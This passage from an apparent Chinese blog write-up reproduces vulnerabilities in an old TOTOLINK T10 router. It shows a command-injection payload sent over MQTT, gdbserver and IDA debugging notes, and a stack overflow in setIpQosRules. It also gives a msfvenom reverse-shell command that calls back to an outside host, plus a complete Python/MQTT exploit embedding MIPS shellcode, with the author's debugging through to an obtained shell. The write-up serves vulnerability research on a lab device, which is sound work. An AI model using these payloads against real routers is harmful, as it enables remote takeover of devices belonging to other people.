alt=\"image-20230514115843851\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514115827103.png\" alt=\"image-20230514115827103\"></p>\n<h4 id=\"6-5-3-meshInfoKick-命令执行\"><a href=\"#6-5-3-meshInfoKick-命令执行\" class=\"headerlink\" title=\"6.5.3 meshInfoKick 命令执行\"></a>6.5.3 meshInfoKick 命令执行</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/meshInfoKick</span><br><span class=\"line\">    </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/meshInfoKick&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ipAddr&quot;</span>:<span class=\"string\">&quot;;/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/meshInfoKick;&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514120847962.png\" alt=\"image-20230514120847962\"></p>\n<p>​\t\t有点小问题,还没调试好</p>\n<h2 id=\"6-6-lan-so、wan-so、wps-so\"><a href=\"#6-6-lan-so、wan-so、wps-so\" class=\"headerlink\" title=\"6.6 lan.so、wan.so、wps.so\"></a>6.6 lan.so、wan.so、wps.so</h2><p>没找到</p>\n<h1 id=\"七、溢出漏洞调试\"><a href=\"#七、溢出漏洞调试\" class=\"headerlink\" title=\"七、溢出漏洞调试\"></a>七、溢出漏洞调试</h1><h2 id=\"7-1-gdbserver调试\"><a href=\"#7-1-gdbserver调试\" class=\"headerlink\" title=\"7.1 gdbserver调试\"></a>7.1 gdbserver调试</h2><p>​\t\t被调试的机器下载gdbserver,然后启动 gdbserver 192.168.xx.xx:1234 .&#x2F;helloworld,或者进行attach进程</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/gdb# ./gdbserver<span class=\"number\">-7.10</span><span class=\"number\">.1</span>-x64 :<span class=\"number\">80</span> --attach <span class=\"number\">17031</span></span><br><span class=\"line\">Attached; pid = <span class=\"number\">17031</span></span><br><span class=\"line\">Listening on port <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://github.com/akpotter/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver\">https://github.com/akpotter/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver</a></p>\n<p>调试机器开启gdb后连接即可 (gdb) target remote 192.168.xx.xx:1234</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; target remote xxxxxx:<span class=\"number\">80</span></span><br><span class=\"line\">Remote debugging using xxxxxxxx:<span class=\"number\">80</span></span><br><span class=\"line\">Reading /home/ubuntu/gdb/pwn2 from remote target...</span><br><span class=\"line\">warning: File transfers from remote targets can be slow. Use <span class=\"string\">&quot;set sysroot&quot;</span> to access files locally instead.</span><br><span class=\"line\">Reading /home/ubuntu/gdb/pwn2 from remote target...</span><br><span class=\"line\">Reading symbols from target:/home/ubuntu/gdb/pwn2...</span><br><span class=\"line\">(No debugging symbols found in target:/home/ubuntu/gdb/pwn2)</span><br><span class=\"line\"><span class=\"number\">0x0000000000400a40</span> in _start ()</span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t在这里踩了很多坑,很多时候连上能成功,但是ni执行的时候就出问题了,立马断掉,进程就会挂掉,尝试很多不同的gdbserver,自己也尝试编译了一下,都失败了,马上要放弃的时候,又找了一个版本<a href=\"https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver\">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>\n<p>rapid7编译的,可以正常使用了</p>\n<h2 id=\"7-2-ida动态调试-远程调试\"><a href=\"#7-2-ida动态调试-远程调试\" class=\"headerlink\" title=\"7.2 ida动态调试\\远程调试\"></a>7.2 ida动态调试\\远程调试</h2><p>​\t\t和gdbserver联动</p>\n<h3 id=\"7-2-1附加调试-无符号信息\"><a href=\"#7-2-1附加调试-无符号信息\" class=\"headerlink\" title=\"7.2.1附加调试(无符号信息)\"></a>7.2.1附加调试(无符号信息)</h3><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508190616664.png\" alt=\"image-20230508190616664\" style=\"zoom: 33%;\">\n\n\n\n<p>这种方式没有反汇编的函数信息等</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508191055311.png\" alt=\"image-20230508191055311\"></p>\n<p>设置mipsel </p>\n<p>选择 Processor type</p>\n<p>基本命令 <a href=\"https://blog.csdn.net/m0_52164435/article/details/124871122\">https://blog.csdn.net/m0_52164435/article/details/124871122</a></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508191409485.png\" alt=\"image-20230508191409485\"></p>\n<h3 id=\"7-2-2-运行调试-有符号信息\"><a href=\"#7-2-2-运行调试-有符号信息\" class=\"headerlink\" title=\"7.2.2 运行调试(有符号信息)\"></a>7.2.2 运行调试(有符号信息)</h3><p>​\t\t先加载二进制文件,main函数处下断点、debugger–process options 设置好ip和端口</p>\n<img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508191959853.png\" alt=\"image-20230508191959853\" style=\"zoom:33%;\">\n\n\n\n<p>被调试那里开启服务,然后debugger-attach to process即可</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508192153803.png\" alt=\"image-20230508192153803\"></p>\n<p>​\t\t如果不确定本地的版本和远程的时候一样可以导出二进制文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat ./cs_broker  | /tmp/busybox-mipsel base64        # 编码过程</span><br><span class=\"line\"># 将base64编码的内容保存到本地文件pcap64</span><br><span class=\"line\">cat cs | base64 -d &gt; cs_broker         # 解码过程</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t.&#x2F;gdbserver.mipsle :9999 –attach 1335  ida能够成功连接上,但是ida那边运行后,一发送mqtt包就会蹦.. 偶尔能调试成功,能单步走..比较玄学,因为gdb那边调试没用问题,就先用gdb进行调试了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ./gdbserver.mipsle :<span class=\"number\">9999</span> --attach <span class=\"number\">1335</span></span><br><span class=\"line\">Attached; pid = <span class=\"number\">1335</span></span><br><span class=\"line\">Listening on port <span class=\"number\">9999</span></span><br><span class=\"line\">Remote debugging from host <span class=\"number\">192.168</span><span class=\"number\">.55</span><span class=\"number\">.3</span></span><br><span class=\"line\">Connection closed by foreign host.</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"># ./gdbserver.mipsle :<span class=\"number\">9999</span> --attach <span class=\"number\">1335</span></span><br><span class=\"line\">Attached; pid = <span class=\"number\">1335</span></span><br><span class=\"line\">Listening on port <span class=\"number\">9999</span></span><br><span class=\"line\">Remote debugging from host <span class=\"number\">192.168</span><span class=\"number\">.55</span><span class=\"number\">.3</span></span><br><span class=\"line\">ptrace: Input/output error.</span><br><span class=\"line\">input_interrupt, count = <span class=\"number\">1</span> c = <span class=\"number\">36</span> (<span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">input_interrupt, count = <span class=\"number\">1</span> c = <span class=\"number\">36</span> (<span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">input_interrupt, count = <span class=\"number\">1</span> c = <span class=\"number\">107</span> (<span class=\"string\">&#x27;k&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>好像和二进制文件有关?</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The current debugger <span class=\"title function_\">backend</span> <span class=\"params\">(gdb)</span> does not provide memory information to IDA.</span><br><span class=\"line\">Therefore the memory contents may be invisible by <span class=\"keyword\">default</span>.</span><br><span class=\"line\">Please use the Debugger/Manual memory regions menu item to configure the memory layout.</span><br><span class=\"line\">It is possible to define just one big region <span class=\"keyword\">for</span> the whole <span class=\"title function_\">memory</span></span><br><span class=\"line\"><span class=\"params\">(IDA will display question marks <span class=\"keyword\">for</span> missing memory regions in this <span class=\"keyword\">case</span>)</span>.</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"7-3-filewall-so库中setIpQosRules函数栈溢出调试\"><a href=\"#7-3-filewall-so库中setIpQosRules函数栈溢出调试\" class=\"headerlink\" title=\"7.3 filewall.so库中setIpQosRules函数栈溢出调试\"></a>7.3 filewall.so库中setIpQosRules函数栈溢出调试</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">setIpQosRules</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">int</span> a2, <span class=\"type\">int</span> a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ......</span><br><span class=\"line\">  <span class=\"type\">char</span> v14[<span class=\"number\">23</span>]; <span class=\"comment\">// [sp+18h] [-B8h] BYREF</span></span><br><span class=\"line\">  ......</span><br><span class=\"line\">  v12 = (<span class=\"type\">const</span> <span class=\"type\">char</span> *)websGetVar(a2, <span class=\"string\">&quot;comment&quot;</span>, &amp;byte_9268);</span><br><span class=\"line\">\t......</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(v14, v12);</span><br><span class=\"line\">  apmib_set(<span class=\"number\">131385</span>, v14);</span><br><span class=\"line\">  apmib_set(<span class=\"number\">65848</span>, v14);</span><br><span class=\"line\">  apmib_update_web(<span class=\"number\">4</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;sysconf firewall&quot;</span>);</span><br><span class=\"line\">  websSetCfgResponse(a1, a3, <span class=\"string\">&quot;0&quot;</span>, <span class=\"string\">&quot;reserv&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tcomment明显存在溢出,复制给栈上数据v14</p>\n<h4 id=\"7-3-1-利用脚本\"><a href=\"#7-3-1-利用脚本\" class=\"headerlink\" title=\"7.3.1 利用脚本\"></a>7.3.1 利用脚本</h4><p>生成反弹shell payload:msfvenom -p linux&#x2F;mipsle&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.55.4 LPORT&#x3D;9999 -f py -o mips.txt</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> paho.mqtt.client <span class=\"keyword\">as</span> mqtt</span><br><span class=\"line\"></span><br><span class=\"line\">buf = <span class=\"string\">&quot;\\xfa\\xff\\x0f\\x24\\x27\\x78\\xe0\\x01\\xfd\\xff\\xe4\\x21&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xfd\\xff\\xe5\\x21\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x0c\\x01\\x01\\x01\\xff\\xff\\xa2\\xaf\\xff\\xff\\xa4\\x8f&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xfd\\xff\\x0f\\x34\\x27\\x78\\xe0\\x01\\xe2\\xff\\xaf\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x27\\x0f\\x0e\\x3c\\x27\\x0f\\xce\\x35\\xe4\\xff\\xae\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x37\\x02\\x0e\\x3c\\xc0\\xa8\\xce\\x35\\xe6\\xff\\xae\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xe2\\xff\\xa5\\x27\\xef\\xff\\x0c\\x24\\x27\\x30\\x80\\x01&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x4a\\x10\\x02\\x24\\x0c\\x01\\x01\\x01\\xfd\\xff\\x11\\x24&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x27\\x88\\x20\\x02\\xff\\xff\\xa4\\x8f\\x21\\x28\\x20\\x02&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\xff\\xff\\x10\\x24&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xff\\xff\\x31\\x22\\xfa\\xff\\x30\\x16\\xff\\xff\\x06\\x28&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x62\\x69\\x0f\\x3c\\x2f\\x2f\\xef\\x35\\xec\\xff\\xaf\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x73\\x68\\x0e\\x3c\\x6e\\x2f\\xce\\x35\\xf0\\xff\\xae\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xf4\\xff\\xa0\\xaf\\xec\\xff\\xa4\\x27\\xf8\\xff\\xa4\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xfc\\xff\\xa0\\xaf\\xf8\\xff\\xa5\\x27\\xab\\x0f\\x02\\x24&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x0c\\x01\\x01\\x01&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">test = <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">218</span></span><br><span class=\"line\"></span><br><span class=\"line\">client = mqtt.Client()</span><br><span class=\"line\">client.connect(<span class=\"string\">&quot;192.168.55.1&quot;</span>,<span class=\"number\">1883</span>,<span class=\"number\">60</span>)</span><br><span class=\"line\">client.publish(<span class=\"string\">&#x27;totolink/router/setting/setIpQosRules&#x27;</span>,payload=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setIpQosRules&quot;,&quot;comment&quot;:&quot;xx&#x27;</span>+test+<span class=\"string\">&#x27;\\xb4\\x43\\x41&quot;&#125;&#x27;</span>+<span class=\"string\">&#x27;bling&#x27;</span>+buf)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t偏移量具体多少可以在调试的时候查看</p>\n<h4 id=\"7-3-2-调试案例\"><a href=\"#7-3-2-调试案例\" class=\"headerlink\" title=\"7.3.2 调试案例\"></a>7.3.2 调试案例</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">路由器上</span><br><span class=\"line\"># ./gdbserver.mipsle :<span class=\"number\">9999</span> --attach <span class=\"number\">14725</span></span><br><span class=\"line\">Attached; pid = <span class=\"number\">14725</span></span><br><span class=\"line\">Listening on port <span class=\"number\">9999</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">调试机器</span><br><span class=\"line\">target remote <span class=\"number\">192.168</span><span class=\"number\">.55</span><span class=\"number\">.1</span>:<span class=\"number\">9999</span></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">   </span><br><span class=\"line\">    </span><br><span class=\"line\">vmmap</span><br><span class=\"line\">例如查到firewall.so的基地址是<span class=\"number\">0x778ec000</span></span><br><span class=\"line\"></span><br><span class=\"line\">.text:<span class=\"number\">00003414</span>                 la      $t9, <span class=\"built_in\">strcpy</span></span><br><span class=\"line\">.text:<span class=\"number\">00003418</span>                 jalr    $t9 ; <span class=\"built_in\">strcpy</span></span><br><span class=\"line\">.text:<span class=\"number\">0000341</span>C                 move    $a1, $s1         <span class=\"meta\"># src</span></span><br><span class=\"line\">.text:<span class=\"number\">00003420</span>                 lw      $gp, <span class=\"number\">0xD0</span>+var_C0($sp)</span><br><span class=\"line\">.text:<span class=\"number\">00003424</span>                 li      $a0, <span class=\"number\">0x20139</span></span><br><span class=\"line\"></span><br><span class=\"line\">ida中看到<span class=\"built_in\">strcpy</span>的地址是<span class=\"number\">00003418</span>, 于是下断点在<span class=\"number\">0x778ec000</span>+<span class=\"number\">0x0003418</span> = <span class=\"number\">0x778ef418</span></span><br><span class=\"line\">b *<span class=\"number\">0x778ef418</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">此外,为了更好的查看覆盖返回地址情况</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">可以在开头再下一个断点,     sw      $ra, <span class=\"number\">0xD0</span>+var_s24($sp) 这个是存放返回地址的指令,放在$ra寄存器里</span><br><span class=\"line\">.text:<span class=\"number\">0000329</span>C                 li      $gp, (_fdata+<span class=\"number\">0x7FF0</span> - .)</span><br><span class=\"line\">.text:<span class=\"number\">000032</span>A4                 addu    $gp, $t9</span><br><span class=\"line\">.text:<span class=\"number\">000032</span>A8                 addiu   $sp, <span class=\"number\">-0xF8</span></span><br><span class=\"line\">.text:<span class=\"number\">000032</span>AC                 sw      $ra, <span class=\"number\">0xD0</span>+var_s24($sp)</span><br><span class=\"line\"></span><br><span class=\"line\">以及下断点到最后,查看最后劫持返回地址的效果</span><br><span class=\"line\">.text:<span class=\"number\">000034</span>C4                 jr      $ra</span><br><span class=\"line\">    </span><br><span class=\"line\">然后c继续执行</span><br><span class=\"line\">    </span><br><span class=\"line\">由于第一次进行<span class=\"built_in\">strcpy</span>会会进行<span class=\"built_in\">strcpy</span>动态链接的符号解析等等,而且gdb中不知道为什么finish等不能用,所以先随便发点东西,不触发漏洞,在第二次运行时,再触发漏洞,具体查看<span class=\"built_in\">strcpy</span>的过程( 非常容易打挂...调试了很多次)</span><br><span class=\"line\">    \t</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这四行代码是复制语句,将输入复制到栈上,</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163515070.png\" alt=\"image-20230514163515070\"></p>\n<p>​\t\t复制成功后,看到已经把返回地址修改了</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163617803.png\" alt=\"image-20230514163617803\"></p>\n<p>​\t\t0x4143b4就是shellcode的开始</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163647722.png\" alt=\"image-20230514163647722\"></p>\n<p>​\t\t返回处 跳到shellcode\t开始执行\t<img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163708915.png\" alt=\"image-20230514163708915\"></p>\n<p>​\t\t获取反弹shell</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163745190.png\" alt=\"image-20230514163745190\"></p>\n<h4 id=\"7-3-3-遇到的坑\"><a href=\"#7-3-3-遇到的坑\" class=\"headerlink\" title=\"7.3.3 遇到的坑\"></a>7.3.3 遇到的坑</h4><p>​\t\t刚开始调试的时候,发现怎么也弹不回shell,(在mac上开的nc,后来发现其实链接已经建立了,),调试了好久</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514162741686.png\" alt=\"image-20230514162741686\"></p>\n<p>​\t\t其实已经收到了shell,但是没有提示显示….</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514164256153.png\" alt=\"image-20230514164256153\"></p>\n<h1 id=\"八、参考\"><a href=\"#八、参考\" class=\"headerlink\" title=\"八、参考\"></a>八、参考</h1><p><a href=\"https://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/\">https://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/</a></p>\n<p><a href=\"https://zone.huoxian.cn/d/2676-totolink-cve-2022-25084\">https://zone.huoxian.cn/d/2676-totolink-cve-2022-25084</a></p>\n<p><a href=\"https://www.52pojie.cn/thread-1715223-1-1.html\">https://www.52pojie.cn/thread-1715223-1-1.html</a></p>\n<p><a href=\"https://github.com/gtrboy/totolink\">https://github.com/gtrboy/totolink</a> </p>\n<p><a href=\"https://github.com/SeppPenner/mqttfx171-backup/tree/master/Binaries\">https://github.com/SeppPenner/mqttfx171-backup/tree/master/Binaries</a></p>\n<p><a href=\"https://web.archive.org/web/20220504092050/http://www.jensd.de/apps/mqttfx/1.7.1/\">https://web.archive.org/web/20220504092050/http://www.jensd.de/apps/mqttfx/1.7.1/</a></p>\n<p><a href=\"https://mqttfx.jensd.de/index.php/download\">https://mqttfx.jensd.de/index.php/download</a></p>\n<p><a href=\"https://blog.csdn.net/dong__ge/article/details/126322091\">https://blog.csdn.net/dong__ge/article/details/126322091</a></p>\n<p><a href=\"https://blog.csdn.net/m0_43406494/article/details/124815879\">https://blog.csdn.net/m0_43406494/article/details/124815879</a></p>\n",
            "tags": [
                "路由器"
            ]
        }
    ]
}